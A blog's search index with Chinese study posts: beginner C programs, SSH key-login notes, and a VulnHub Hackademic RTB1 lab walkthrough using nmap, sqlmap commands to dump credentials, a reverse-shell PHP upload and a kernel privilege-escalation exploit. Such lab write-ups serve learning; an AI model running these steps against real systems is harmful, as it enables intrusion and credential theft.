<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>C语言相关1</title>
    <url>/2023/08/01/C%E8%AF%AD%E8%A8%80%E7%9B%B8%E5%85%B31/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>所以 最近很闲 所以开始学c语言</p>
<span id="more"></span>
<h1 id="准备步骤"><a href="#准备步骤" class="headerlink" title="准备步骤"></a>准备步骤</h1><p>我使用了visual studio code配置c语言环境的方法来实现程序的调试和运行<br><a href="https://www.bilibili.com/video/BV19c411G7ey">我所参考的教程</a></p>
<h1 id="学习笔记啥的"><a href="#学习笔记啥的" class="headerlink" title="学习笔记啥的"></a>学习笔记啥的</h1><h2 id="一-经典到不能再经典的hello-world"><a href="#一-经典到不能再经典的hello-world" class="headerlink" title="一.经典到不能再经典的hello world"></a>一.经典到不能再经典的hello world</h2><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
 
int main()
{
    /* 我的第一个 C 程序 */
    printf("Hello, World! \n");
 
    return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>实例解析：</strong></p>
<ul>
<li>所有的 C 语言程序都需要包含&nbsp;<strong>main()</strong>&nbsp;函数。 代码从&nbsp;<strong>main()</strong>&nbsp;函数开始执行。</li>
<li><strong>/* … */</strong>&nbsp;用于注释说明。</li>
<li><strong>printf()</strong>&nbsp;用于格式化输出到屏幕。<strong>printf()</strong>&nbsp;函数在&nbsp;<strong>“stdio.h”</strong>&nbsp;头文件中声明。</li>
<li><strong>stdio.h</strong>&nbsp;是一个头文件 (标准输入输出头文件) ,&nbsp;<strong>#include</strong>&nbsp;是一个预处理命令，用来引入头文件。 当编译器遇到&nbsp;<strong>printf()</strong>&nbsp;函数时，如果没有找到&nbsp;<strong>stdio.h</strong>&nbsp;头文件，会发生编译错误。</li>
<li><strong>return 0;</strong>&nbsp;语句用于表示退出程序。</li>
</ul>
<h2 id="二-关于定义变量和变量的类型"><a href="#二-关于定义变量和变量的类型" class="headerlink" title="二.关于定义变量和变量的类型"></a>二.关于定义变量和变量的类型</h2><h3 id="（1）单纯的计算"><a href="#（1）单纯的计算" class="headerlink" title="（1）单纯的计算"></a>（1）单纯的计算</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt; //这个是类似于import的东西 没有它printf会失效
int x;// 这里是我定义了x
int y;// 这里是我定义了y
int wow()// 定义一个叫wow（）的进程
{
&nbsp; &nbsp; extern int x;// 借用外部定义好的x
&nbsp; &nbsp; extern int y;// 借用外部定义好的y
&nbsp; &nbsp; x = 1222;
&nbsp; &nbsp; y = 1999;// 为x y赋值
&nbsp; &nbsp; return x*y;// 程序的结果是输出x乘以y的数字
}
int main()// 主程序 不能缺少
{
&nbsp; &nbsp; int jieguo;
&nbsp; &nbsp; jieguo = wow(); //用jieguo这个定义好的变量来表示wow（）的结果
&nbsp; &nbsp; printf("你得到的结果是：%d",jieguo);//将输出的东西表示出来
&nbsp; &nbsp; return 0;//结束程序
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出结果：</p>
<pre class="line-numbers language-none"><code class="language-none">你得到的结果是：2442778<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>题外话：<br>printf（）中的%d指输出整数，实际显示的时候会被逗号后的结果所代替。</p>
<h3 id="（2）利用scanf-加入互动环节"><a href="#（2）利用scanf-加入互动环节" class="headerlink" title="（2）利用scanf()加入互动环节"></a>（2）利用scanf()加入互动环节</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt; //这个是类似于import的东西 没有它printf会失效
int x=0;// 这里是我定义了x
int y=0;// 这里是我定义了y
int wow()// 定义一个叫wow（）的进程
{
&nbsp; &nbsp; extern int x;// 借用外部定义好的x
&nbsp; &nbsp; extern int y;// 借用外部定义好的y
&nbsp; &nbsp; printf("请输入x值\n");
&nbsp; &nbsp; scanf("%d",&amp;x);
&nbsp; &nbsp; printf("请输入y值\n");
&nbsp; &nbsp; scanf("%d",&amp;y);
&nbsp; &nbsp; return x*y;// 程序的结果是输出x乘以y的数字
}
int main()// 主程序 不能缺少
{
&nbsp; &nbsp; int jieguo;
&nbsp; &nbsp; jieguo = wow(); //用jieguo这个定义好的变量来表示wow（）的结果
&nbsp; &nbsp; printf("你得到的结果是：%d",jieguo);//将输出的东西表示出来
&nbsp; &nbsp; return 0;//结束程序
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出：</p>
<pre class="line-numbers language-none"><code class="language-none">请输入x值
9
请输入y值
11
你得到的结果是：99<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>题外话：<br>scanf()中输入的东西是他所需要获取的 如加入逗号或者空格后不按照格式输入<br>理论来说会无法读取<br>\n代表换行<br>scanf(“%d, %d, %d”,&amp;a,&amp;b,&amp;c);  ←复合用法</p>
<h2 id="三-循环与if-else"><a href="#三-循环与if-else" class="headerlink" title="三.循环与if else"></a>三.循环与if else</h2><h3 id="（1）while"><a href="#（1）while" class="headerlink" title="（1）while"></a>（1）while</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
int main()
{
&nbsp; &nbsp; int i=0;
&nbsp; &nbsp; while (i&lt;=100)
&nbsp; &nbsp; {
&nbsp; &nbsp; &nbsp; &nbsp; i++;
&nbsp; &nbsp; &nbsp; &nbsp; printf("第%d",i);
&nbsp; &nbsp; &nbsp; &nbsp; printf("次\n");
&nbsp; &nbsp; }
&nbsp; &nbsp; return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>结果：</p>
<pre class="line-numbers language-none"><code class="language-none">第1次
第2次
第3次
第4次
第5次
第6次
第7次
第8次
第9次
(中略)
第101次<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>说真的 c语言和python蛮像哈？<br>下表显示了 C 语言支持的所有算术运算符。假设变量&nbsp;<strong>A</strong>&nbsp;的值为 10，变量&nbsp;<strong>B</strong>&nbsp;的值为 20，则：</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>把两个操作数相加</td>
<td>A + B 将得到 30</td>
</tr>
<tr>
<td>-</td>
<td>从第一个操作数中减去第二个操作数</td>
<td>A - B 将得到 -10</td>
</tr>
<tr>
<td>*</td>
<td>把两个操作数相乘</td>
<td>A * B 将得到 200</td>
</tr>
<tr>
<td>/</td>
<td>分子除以分母</td>
<td>B / A 将得到 2</td>
</tr>
<tr>
<td>%</td>
<td>取模运算符，整除后的余数</td>
<td>B % A 将得到 0</td>
</tr>
<tr>
<td>++</td>
<td>自增运算符，整数值增加 1</td>
<td>A++ 将得到 11</td>
</tr>
<tr>
<td>–</td>
<td>自减运算符，整数值减少 1</td>
<td>A– 将得到 9</td>
</tr>
</tbody></table>
<h3 id="（2）if-else与switch-case"><a href="#（2）if-else与switch-case" class="headerlink" title="（2）if else与switch-case"></a>（2）if else与switch-case</h3><p>以下两种代码实现的是一种功能</p>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
int main(){
&nbsp; &nbsp; int type=0;
&nbsp; &nbsp; printf("请输入1-5以内的数字来获取回应\n");
&nbsp; &nbsp; scanf("%d",&amp;type);
&nbsp; &nbsp; if ( type==1 )
&nbsp; &nbsp; &nbsp; &nbsp; printf("1");
&nbsp; &nbsp; else if ( type==2 )
&nbsp; &nbsp; &nbsp; &nbsp; printf("2");
&nbsp; &nbsp; else if ( type==3 )
&nbsp; &nbsp; &nbsp; &nbsp; printf("3");
&nbsp; &nbsp; else if ( type==4 )
&nbsp; &nbsp; &nbsp; &nbsp; printf("4");
&nbsp; &nbsp; else if ( type==5 )
&nbsp; &nbsp; &nbsp; &nbsp; printf("5");
&nbsp; &nbsp; else
&nbsp; &nbsp; &nbsp; &nbsp; printf("格式错误");
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
int main(){
&nbsp; &nbsp; int type=0;
&nbsp; &nbsp; printf("请输入1-5以内的数字来获取回应\n");
&nbsp; &nbsp; scanf("%d",&amp;type);
&nbsp; &nbsp; switch (type) {
&nbsp; &nbsp; &nbsp; &nbsp; case 1:
&nbsp; &nbsp; &nbsp; &nbsp; print("1");
&nbsp; &nbsp; &nbsp; &nbsp; break;
&nbsp; &nbsp; &nbsp; &nbsp; case 2:
&nbsp; &nbsp; &nbsp; &nbsp; printf("2");
&nbsp; &nbsp; &nbsp; &nbsp; break;
&nbsp; &nbsp; &nbsp; &nbsp; case 3:
&nbsp; &nbsp; &nbsp; &nbsp; printf("3");
&nbsp; &nbsp; &nbsp; &nbsp; break;
&nbsp; &nbsp; &nbsp; &nbsp; case 4:
&nbsp; &nbsp; &nbsp; &nbsp; printf("4");
&nbsp; &nbsp; &nbsp; &nbsp; break;
&nbsp; &nbsp; &nbsp; &nbsp; case 5:
&nbsp; &nbsp; &nbsp; &nbsp; printf("5");
&nbsp; &nbsp; &nbsp; &nbsp; break;
&nbsp; &nbsp; &nbsp; &nbsp; default:
&nbsp; &nbsp; &nbsp; &nbsp; printf("格式错误");
&nbsp; &nbsp; &nbsp; &nbsp; break;
&nbsp; &nbsp; }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>结论都是一样的</p>
<h2 id="四、while和do-while"><a href="#四、while和do-while" class="headerlink" title="四、while和do while"></a>四、while和do while</h2><h3 id="（1）while-1"><a href="#（1）while-1" class="headerlink" title="（1）while"></a>（1）while</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
int main(){
&nbsp; &nbsp; int o=0;
&nbsp; &nbsp; while ( o&lt;10)
&nbsp; &nbsp; {
&nbsp; &nbsp; &nbsp; &nbsp; o++;
&nbsp; &nbsp; &nbsp; &nbsp; printf("%d",o);
&nbsp; &nbsp; &nbsp; &nbsp; printf("\n");
&nbsp; &nbsp; }
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>简称来说就是当条件成立时 一直重复运行某物</p>
<p>输出：</p>
<pre class="line-numbers language-none"><code class="language-none">1
2
3
4
5
6
7
8
9
10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="2-do-while"><a href="#2-do-while" class="headerlink" title="(2) do while"></a>(2) do while</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
int main(){
&nbsp; &nbsp; int i=0;
&nbsp; &nbsp; do
&nbsp; &nbsp; {
&nbsp; &nbsp; &nbsp; &nbsp; i++;
&nbsp; &nbsp; &nbsp; &nbsp; printf("%d",i);
&nbsp; &nbsp; &nbsp; &nbsp; printf("\n");
&nbsp; &nbsp; } while ( i != 10);
&nbsp; &nbsp; return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>while的换了个顺序版本<br>结果都是一样的就不放出来了</p>
<h2 id="五、整合一下先"><a href="#五、整合一下先" class="headerlink" title="五、整合一下先"></a>五、整合一下先</h2><h3 id="（1）比大小"><a href="#（1）比大小" class="headerlink" title="（1）比大小"></a>（1）比大小</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
int main(){
&nbsp; &nbsp; int a,b,c,max;
&nbsp; &nbsp; printf("请输入三个数字 以逗号隔开\n");
&nbsp; &nbsp; scanf("%d,%d,%d",&amp;a,&amp;b,&amp;c);
&nbsp; &nbsp; if(a&gt;b){ &nbsp;
	&nbsp; &nbsp; max = a;
&nbsp; &nbsp; }else{
	&nbsp; &nbsp; max = b;
&nbsp; &nbsp; }
&nbsp; &nbsp; if(c&gt;max){
	&nbsp; &nbsp; max = c;
&nbsp; &nbsp; }
&nbsp; &nbsp; printf("max=%d", max);
&nbsp; &nbsp; return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>输出:</p>
<pre class="line-numbers language-none"><code class="language-none">请输入三个数字 以逗号隔开
3,1,6 
max=6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="（2）九九乘法表"><a href="#（2）九九乘法表" class="headerlink" title="（2）九九乘法表"></a>（2）九九乘法表</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
int main()
{
&nbsp; &nbsp; int n=9;
&nbsp; &nbsp; int i,j;
&nbsp; &nbsp; i=1;
&nbsp; &nbsp; while (i&lt;=n)
&nbsp; &nbsp; {
&nbsp; &nbsp; &nbsp; &nbsp; j=1;
&nbsp; &nbsp; &nbsp; &nbsp; while (j&lt;=i)
&nbsp; &nbsp; &nbsp; &nbsp; {
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("%d*%d=%d",j,i,j*i);
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ((i*j&lt;10))
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf(" &nbsp; ");
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } else {
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf(" &nbsp;");
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; j++;
&nbsp; &nbsp; &nbsp; &nbsp; }
&nbsp; &nbsp; &nbsp; &nbsp; printf("\n");
&nbsp; &nbsp; &nbsp; &nbsp; i++;
&nbsp; &nbsp; }
&nbsp; &nbsp; return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>输出:</p>
<pre class="line-numbers language-none"><code class="language-none">1*1=1   
1*2=2   2*2=4   
1*3=3   2*3=6   3*3=9   
1*4=4   2*4=8   3*4=12  4*4=16  
1*5=5   2*5=10  3*5=15  4*5=20  5*5=25  
1*6=6   2*6=12  3*6=18  4*6=24  5*6=30  6*6=36  
1*7=7   2*7=14  3*7=21  4*7=28  5*7=35  6*7=42  7*7=49  
1*8=8   2*8=16  3*8=24  4*8=32  5*8=40  6*8=48  7*8=56  8*8=64
1*9=9   2*9=18  3*9=27  4*9=36  5*9=45  6*9=54  7*9=63  8*9=72  9*9=81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>c语言</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Hackademic.RTB1</title>
    <url>/2023/11/21/Hackademic-RTB1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><blockquote>
<p><strong>那么好的我们废话不多说——</strong></p>
</blockquote>
<p>靶机名称：  Hackademic: RTB1<br>下载链接：<br><a href="https://download.vulnhub.com/hackademic/Hackademic.RTB1.zip">https://download.vulnhub.com/hackademic/Hackademic.RTB1.zip</a> </p>
<span id="more"></span>
<h1 id="1-进入靶场"><a href="#1-进入靶场" class="headerlink" title="1.进入靶场"></a>1.进入靶场</h1><p>首先我们下载好靶机 照常启动kali与靶机<br><img data-src="/2023/11/21/Hackademic-RTB1/1.jpg" alt="1.jpg"></p>
<h1 id="2-解析过程"><a href="#2-解析过程" class="headerlink" title="2.解析过程"></a>2.解析过程</h1><h2 id="1）靶机的发现"><a href="#1）靶机的发现" class="headerlink" title="1）靶机的发现"></a>1）靶机的发现</h2><p>老样子扫描同网段设备<br><code>arp-scan -l</code><br><img data-src="/2023/11/21/Hackademic-RTB1/2.jpg" alt="2.jpg"><br>↑发现靶机ip地址 使用nmap扫描存活端口<br><code>nmap -p- '目标ip'</code><br><strong>ps:多半扫得很慢 不知道什么原因 请耐心等待2-5分钟</strong><br>结果出来是22端口和80端口<br>我们这里直接通过firefox访问ip<br><img data-src="/2023/11/21/Hackademic-RTB1/3.jpg" alt="3.jpg"><br>↑页面通过f12并没有看出什么端倪 但有很多超链接<br>通过在网址后输入sql注入语句<br>我们可以判断出其中一个指向了mysql数据库<br>于是将该网址交给sqlmap 看是否能爆出数据</p>
<h2 id="2）sqlmap爆破"><a href="#2）sqlmap爆破" class="headerlink" title="2）sqlmap爆破"></a>2）sqlmap爆破</h2><p>我们利用以下语句来爆出数据库的内容</p>
<pre class="line-numbers language-none"><code class="language-none">sqlmap -u "目标ip" //查看是否存在漏洞
sqlmap -u "目标ip" --dbs //查看具体数据库
sqlmap -u "目标ip" -D "选定数据库" --tables //查看数据库内的表
sqlmap -u "目标ip" -D "选定数据库" -T "选定表" --columns //查看数据表内的集合
sqlmap -u "目标ip" -D "选定数据库" -T "选定表" -C "选定集合" --dump //爆出集合内的数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img data-src="/2023/11/21/Hackademic-RTB1/4.jpg" alt="4.jpg"><br>↑查看网址是否存在漏洞 与当前数据类型<br><img data-src="/2023/11/21/Hackademic-RTB1/5.jpg" alt="5.jpg"><br>↑爆数据库<br><img data-src="/2023/11/21/Hackademic-RTB1/6.jpg" alt="6.jpg"><br>↑爆tables<br><img data-src="/2023/11/21/Hackademic-RTB1/7.jpg" alt="7.jpg"><br>↑通过外语翻译看出login与pass是账号密码相关内容<br><img data-src="/2023/11/21/Hackademic-RTB1/8.jpg" alt="8.jpg"><br>↑最终得出了五组账号密码<br><strong>ps:没有解密出的密码可以自行用md5解码解密</strong></p>
<h2 id="3）后门网址发现与上传漏洞"><a href="#3）后门网址发现与上传漏洞" class="headerlink" title="3）后门网址发现与上传漏洞"></a>3）后门网址发现与上传漏洞</h2><p>我们利用dirsearch工具来发现网站下存在的目录<br><code>dirsearch -u "目标ip"</code><br><img data-src="/2023/11/21/Hackademic-RTB1/9.jpg" alt="9.jpg"><br><img data-src="/2023/11/21/Hackademic-RTB1/10.jpg" alt="10.jpg"><br>↑扫过ip根目录与刚才主页底下的目录后 我们发现了一个名为wp-admin的后门网址<br>于是我们进去看看<br>刚刚有五组账号 我们都试试看 看看哪个权限最大<br>都试过之后发现GerogeMiller账号权限最高 还能让我们上传任意格式的文件<br>kali里是自带一些后端监听php的 我们可以自己复制一个到桌面里编辑后<br>通过kali自带的apache服务来上传文件<br><img data-src="/2023/11/21/Hackademic-RTB1/11.jpg" alt="11.jpg"><br>↑我们在网站options中选择允许文件上传 增加上传格式php<br>刷新页面后上面会出现uploads 让我们上传文件<br><img data-src="/2023/11/21/Hackademic-RTB1/12.jpg" alt="12.jpg"><br>↑这是自带的后门文件<br><img data-src="/2023/11/21/Hackademic-RTB1/13.jpg" alt="13.jpg"><br>↑将监听的返回对象设为本机<br><img data-src="/2023/11/21/Hackademic-RTB1/14.jpg" alt="14.jpg"><br><img data-src="/2023/11/21/Hackademic-RTB1/15.jpg" alt="315.jpg"><br>↑上传完毕后网站会提示你上传的地址 我们在监听后 用firefox复制 访问<br><img data-src="/2023/11/21/Hackademic-RTB1/16.jpg" alt="16.jpg"><br>↑监听完毕之后 我们发现靶机的版本较老旧 有不少漏洞<br><img data-src="/2023/11/21/Hackademic-RTB1/17.jpg" alt="17.jpg"><br>↑ 我们利用searchsploit工具来搜索该机子的漏洞 发现15285.c这个程序可以成功提权（前提是目标计算机安装了gcc程序编译器）<br><img data-src="/2023/11/21/Hackademic-RTB1/18.jpg" alt="18.jpg"><br><img data-src="/2023/11/21/Hackademic-RTB1/19.jpg" alt="19.jpg"><br>↑上传后运行该漏洞 成功获取权限<br><img data-src="/2023/11/21/Hackademic-RTB1/20.jpg" alt="20.jpg"><br>成功获取flag！</p>
<h1 id="那么我们下次见"><a href="#那么我们下次见" class="headerlink" title="那么我们下次见"></a><strong>那么我们下次见</strong></h1></body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>创建个人主页！</title>
    <url>/2023/06/28/hello-world/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>没啥事干所以就创建了<br>这里多半会写课上的笔记<br>在hexo中遇到的技术难关<br>请多指教</p>
</body></html>]]></content>
      <categories>
        <category>日常牢骚</category>
      </categories>
  </entry>
  <entry>
    <title>liunx中ssh服务相关知识</title>
    <url>/2023/11/08/linux%E4%B8%ADssh%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="最近课程讲到了ssh服务-故此做个记录"><a href="#最近课程讲到了ssh服务-故此做个记录" class="headerlink" title="最近课程讲到了ssh服务 故此做个记录"></a>最近课程讲到了ssh服务 故此做个记录</h1><h2 id="1）ssh是什么涅？"><a href="#1）ssh是什么涅？" class="headerlink" title="1）ssh是什么涅？"></a>1）ssh是什么涅？</h2><blockquote>
<p><a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/Secure_Shell">SSH</a>&nbsp;叫安全外壳协议（<strong>S</strong>ecure&nbsp;<strong>Sh</strong>ell），是一种加密的网络传输协议，可在不安全的网络中网络服务提供安全的传输环境。它通过在网络中创建安全隧道来实现 SSH 客户端和服务器之间的连接。</p>
</blockquote>
<h2 id="2）ssh的原理是什么涅？"><a href="#2）ssh的原理是什么涅？" class="headerlink" title="2）ssh的原理是什么涅？"></a>2）ssh的原理是什么涅？</h2><span id="more"></span>
<blockquote>
<p>SSH 之所以一经提出，就得到了快速发展，是因为数据的安全性对任何人都非常重要。这里我们对其保护数据安全的原理进行探究。</p>
</blockquote>
<p>在聊加密前先介绍一下几个密码学的基本概念：</p>
<ul>
<li>明文<code>plaintext</code>&nbsp;指传送方（一般指客户端）想要接受方（一般指服务端）获得的<strong>可读信息</strong></li>
<li>密文<code>ciphertext</code>&nbsp;指明文进过加密后所产生的信息</li>
<li>秘钥<code>key</code>&nbsp;指用来完成加密、解密、完整性验证等密码学应用的密码信息，是明文转换为密文或密文转换为明文的算法需要的参数</li>
<li>私钥 指私有的秘钥</li>
<li>公钥 指公开的秘钥</li>
</ul>
<p>常见的加密有两种：<strong>对称加密</strong>和<strong>非对称加密</strong><br>对称加密: 加密和解密的秘钥使用的是同一个.<br>非对称加密: 与对称加密算法不同，非对称加密算法需要两个密钥：公开密钥（publickey）和私有密钥（privatekey）。</p>
<p>对称加密算法: 密钥较短，破译困难，除了数据加密标准（DES），另一个对称密钥加密系统是国际数据加密算法（IDEA），它比DES的加密性好，且对计算机性能要求也没有那么高.<br>优点:<br>    算法公开、计算量小、加密速度快、加密效率高<br>缺点:<br>    在数据传送前，发送方和接收方必须商定好秘钥，然后 使双方都能保存好秘钥。其次如果一方的秘钥被泄露，那么加密信息也就不安全了。另外，每对用户每次使用对称加密算法时，都需要使用其他人不知道的唯一秘钥，这会使得收、发双方所拥有的钥匙数量巨大，密钥管理成为双方的负担。<br>常见的对称加密算法有: DES、3DES、Blowfish、IDEA、RC4、RC5、RC6 和 AES </p>
<p>非对称加密算法: 公开密钥与私有密钥是一对，如果用公开密钥对数据进行加密，只有用对应的私有密钥才能解密；如果用私有密钥对数据进行加密，那么只有用对应的公开密钥才能解密。因为加密和解密使用的是两个不同的密钥，所以这种算法叫作非对称加密算法。</p>
<p>非对称加密算法实现机密信息交换的基本过程是：甲方生成一对密钥并将其中的一把作为公用密钥向其它方公开；得到该公用密钥的乙方使用该密钥对机密信息进行加密后再发送给甲方；甲方再用自己保存的另一把专用密钥对加密后的信息进行解密。甲方只能用其专用密钥解密由其公用密钥加密后的任何信息。<br>优点:<br>    安全<br>缺点:<br>    速度较慢<br>常见的非对称加密算法有: RSA、ECC（移动设备用）、Diffie-Hellman、El Gamal、DSA（数字签名用）</p>
<h2 id="3）ssh登录与免密登录的方式"><a href="#3）ssh登录与免密登录的方式" class="headerlink" title="3）ssh登录与免密登录的方式"></a>3）ssh登录与免密登录的方式</h2><p>登录方式:<br><code>ssh 用户名@ip地址</code><br>免密登录方式：<br>生成公共身份验证密钥并将其附加到远程主机 ~/.ssh/authorized_keys 文件即可。<br><strong>具体步骤</strong>：</p>
<ol>
<li><p>检查现有的 SSH 密钥对。<br>在生成新的 SSH 密钥对之前，首先检查您的客户端计算机上是否已有 SSH 密钥，因为您不想覆盖现有密钥。<br>运行以下 ls 命令以查看是否存在现有 SSH 密钥：<br><code>ls -al ~/.ssh/id_*.pub</code><br>如果存在现有密钥，您可以使用这些密钥并跳过下一步或备份旧密钥并生成新密钥。<br>如果您看到 No such file or directory 或 no matches found 意味着您没有 SSH 密钥，则可以继续执行下一步并生成新密钥。</p>
</li>
<li><p>生成新的 SSH 密钥对。<br>以下命令将生成一个新的密钥对：<br><code>ssh-keygen</code><br>按 Enter 接受则默认文件位置和文件名：<br><code>Enter file in which to save the key (/home/yourusername/.ssh/id_rsa):</code><br>接下来，ssh-keygen 工具将要求您键入安全密码。无论您是否想要使用密码短语都取决于您，如果您选择使用密码短语，您将获得额外的安全保护。在大多数情况下，开发人员和系统管理员使用 SSH 而不使用密码，因为它们对完全自动化的流程很有用。如果您不想使用密码短语，请按 Enter<br><code>Enter passphrase (empty for no passphrase):</code></p>
</li>
<li><p>要确认是否已经生成 SSH 密钥，您可以使用以下命令列出新的私钥和公钥：</p>
<pre class="line-numbers language-none"><code class="language-none">ls ~/.ssh/id_*
/home/yourusername/.ssh/id_rsa /home/yourusername/.ssh/id_rsa.pub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
<li><p>复制公钥<br>现在您已经生成了 SSH 密钥对，为了能够在没有密码的情况下登录到您的服务器，您需要将公钥复制到您要管理的服务器。<br>将公钥复制到服务器的最简单方法是使用名为的命令 ssh-copy-id 。在您的本地机器终端类型：<br><code>ssh-copy-id remote_username@server_ip_address</code><br>系统将提示您输入 remote_username 的密码：<br><code>remote_username@server_ip_address's password:</code><br>用户通过身份验证后，公钥将附加到远程用户 authorized_keys 文件，并且将关闭连接。<br>如果由于某种原因， ssh-copy-id 本地计算机上没有该实用程序，则可以使用以下命令复制公钥：<br><code>cat ~/.ssh/id_rsa.pub | ssh remote_username@server_ip_address "mkdir -p ~/.ssh &amp;&amp; cat &gt;&gt; ~/.ssh/authorized_keys"</code></p>
</li>
<li><p>使用 SSH 密钥登录服务器<br>完成上述步骤后，您应该能够登录到远程服务器而不会被提示输入密码。<br>尝试通过 SSH 登录到您的服务器：<br><code>ssh remote_username@server_ip_address</code><br>如果一切顺利，您将立即登录。</p>
</li>
</ol>
<h2 id="4）参考资料"><a href="#4）参考资料" class="headerlink" title="4）参考资料"></a>4）参考资料</h2><p><a href="https://zhuanlan.zhihu.com/p/235610836">深入了解SSH</a>————知乎<br><a href="https://blog.csdn.net/weixin_57099902/article/details/132717146">如何设置SSH免密登录</a>————CSDN</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>liunx中sudo服务相关知识</title>
    <url>/2023/11/11/liunx%E4%B8%ADsudo%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</url>
